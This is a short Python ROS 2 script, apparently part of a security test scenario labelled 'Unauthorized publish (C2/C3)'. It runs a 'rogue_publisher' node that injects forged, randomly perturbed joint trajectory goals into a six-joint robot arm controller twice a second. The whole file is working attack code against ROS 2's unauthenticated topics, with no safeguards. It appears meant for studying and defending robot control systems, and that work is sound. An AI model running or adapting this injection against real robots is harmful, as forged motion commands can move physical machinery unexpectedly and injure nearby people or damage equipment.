"""Unauthorized publish (C2/C3): a rogue node sends forged goals to the trajectory controller at 2 Hz."""
import rclpy, random
from rclpy.node import Node
from trajectory_msgs.msg import JointTrajectory, JointTrajectoryPoint
from builtin_interfaces.msg import Duration
J = ["shoulder_pan_joint", "shoulder_lift_joint", "elbow_joint", "wrist_1_joint", "wrist_2_joint", "wrist_3_joint"]
class Rogue(Node):
    def __init__(self):
        super().__init__("rogue_publisher")
        self.pub = self.create_publisher(JointTrajectory, "/joint_trajectory_controller/joint_trajectory", 10)
        self.create_timer(0.5, self.send); self.rng = random.Random(0)
    def send(self):
        m = JointTrajectory(); m.joint_names = J
        q = [self.rng.uniform(-0.3, 0.3), -1.57 + self.rng.uniform(-0.2, 0.2), 1.57, -1.57, -1.57, self.rng.uniform(-0.5, 0.5)]
        m.points.append(JointTrajectoryPoint(positions=q, time_from_start=Duration(sec=1)))
        self.pub.publish(m)
rclpy.init(); rclpy.spin(Rogue())
